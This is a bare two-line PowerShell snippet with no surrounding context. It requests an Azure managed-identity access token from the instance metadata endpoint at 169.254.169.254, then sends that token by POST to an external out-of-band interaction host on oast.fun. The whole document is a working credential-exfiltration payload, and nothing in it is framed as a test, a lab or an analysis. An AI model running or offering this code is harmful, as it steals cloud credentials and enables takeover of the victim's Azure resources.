$t=irm -h @{Metadata=$true} "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
irm -m Post "http://dfgannkgqvqyojhshdpc3dyy1ohn8npn7.oast.fun" -b $t.access_token
